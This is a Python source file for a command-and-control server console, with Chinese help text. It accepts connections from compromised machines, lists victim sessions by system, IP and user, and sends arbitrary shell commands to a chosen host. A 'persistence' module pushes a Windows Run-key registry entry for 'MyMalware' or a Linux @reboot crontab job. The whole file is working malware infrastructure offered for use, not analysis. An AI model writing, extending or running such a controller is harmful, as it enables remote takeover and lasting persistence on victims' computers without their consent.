import socket
import threading
import json
import os
import platform  # 用于检测系统类型
from tabulate import tabulate  # 用于打印表格

class C2Console:
    def __init__(self, host='0.0.0.0', port=8888):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(100)
        self.sessions = {}
        self.session_id = 0
        self.active_module = None
        self.persistence_options = {
            "windows": {
                "reg_path": r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                "program_name": 'MyMalware',
                "program_path": r'C:\Path\To\Your\Program.exe'
            },
            "linux": {
                "cron_job": "@reboot /path/to/your/program"
            }
        }

    def handle_client(self, client_socket, session_id):
        self.sessions[session_id] = {"socket": client_socket, "system": None, "ip": None, "user": None}
        self.sessions[session_id]["ip"] = client_socket.getpeername()[0]
        print(f"Session {session_id} connected")
        while True:
            try:
                message = client_socket.recv(4096).decode()
                if not message:
                    continue
                data = json.loads(message)
                if "system" in data:
                    self.sessions[session_id]["system"] = data["system"]
                    self.sessions[session_id]["user"] = data["user"]
                else:
                    result = data.get("result", "")
                    if result:
                        print(f"Received from session {session_id}: {result}")
            except (ValueError, json.JSONDecodeError) as e:
                print(f"Error decoding: {e}")
            except Exception as e:
                print(f"Error in session {session_id}: {e}")
                client_socket.close()
                del self.sessions[session_id]
                break

    def run(self):
        print("C2 Console running...")
        while True:
            try:
                client_socket, addr = self.server.accept()
                self.session_id += 1
                session_id = self.session_id
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket, session_id))
                client_handler.start()
            except Exception as e:
                print(f"Error accepting connection: {e}")

    def console(self):
        self.current_session = None
        commands = {
            "sessions": "显示所有连接的会话",
            "set session <id>": "选择会话ID",
            "exec <command>": "在目标主机中执行命令",
            "use pre": "使用持久化模块",
            "help": "显示命令帮助信息",
            "exit": "退出会话"
        }
        persistence_commands = {
            "show options": "显示持久化配置",
            "set <option> <value>": "配置持久化选项",
            "exploit": "执行持久化命令"
        }
        while True:
            try:
                command = input("C2> ")
                if command == "sessions":
                    headers = ["Session ID", "System", "IP Address", "User"]
                    table = []
                    for session_id, session_info in self.sessions.items():
                        table.append([session_id, session_info["system"], session_info["ip"], session_info["user"]])
                    print(tabulate(table, headers, tablefmt="pretty"))
                elif command.startswith("set session"):
                    _, _, session_id = command.split()
                    session_id = int(session_id)
                    if session_id in self.sessions:
                        self.current_session = session_id
                        print(f"Session {session_id} selected")
                    else:
                        print(f"Session {session_id} not found")
                elif command.startswith("exec"):
                    _, system_command = command.split(maxsplit=1)
                    if self.current_session:
                        session_id = self.current_session
                        client_socket = self.sessions[session_id]["socket"]
                        client_socket.send(json.dumps({"command": system_command}).encode())
                        print(f"Command sent to session {session_id}")
                    else:
                        print("No session selected")
                elif command == "use pre":
                    self.active_module = "pre"
                    print("Persistence module activated")
                elif command == "show options" and self.active_module == "pre":
                    print(json.dumps(self.persistence_options, indent=4))
                elif command.startswith("set") and self.active_module == "pre":
                    _, option, value = command.split(maxsplit=2)
                    if "windows" in option:
                        key = option.split(".")[1]
                        self.persistence_options["windows"][key] = value
                    elif "linux" in option:
                        key = option.split(".")[1]
                        self.persistence_options["linux"][key] = value
                    print(f"Set {option} to {value}")
                elif command == "exploit" and self.active_module == "pre":
                    if self.current_session:
                        session_id = self.current_session
                        client_socket = self.sessions[session_id]["socket"]
                        system = self.sessions[session_id]["system"].lower()
                        if system == "windows":
                            command = f'reg add {self.persistence_options["windows"]["reg_path"]} /v {self.persistence_options["windows"]["program_name"]} /d {self.persistence_options["windows"]["program_path"]} /f'
                        elif system == "linux":
                            cron_job = self.persistence_options["linux"]["cron_job"]
                            command = f'(echo "{cron_job}") | crontab -'
                        else:
                            print("Unsupported system for persistence")
                            continue
                        client_socket.send(json.dumps({"command": command}).encode())
                        print(f"Exploit command sent to session {session_id}")
                    else:
                        print("No session selected")
                elif command == "help":
                    if self.active_module == "pre":
                        for cmd, desc in persistence_commands.items():
                            print(f"{cmd}: {desc}")
                    else:
                        for cmd, desc in commands.items():
                            print(f"{cmd}: {desc}")
                elif command == "exit":
                    if self.current_session:
                        print(f"Exiting session {self.current_session}")
                        self.current_session = None
                    elif self.active_module:
                        print(f"Exiting module {self.active_module}")
                        self.active_module = None
                    else:
                        print("No session selected or module active")
            except Exception as e:
                print(f"Error in console: {e}")

if __name__ == "__main__":
    c2_console = C2Console()
    threading.Thread(target=c2_console.run).start()
    c2_console.console()
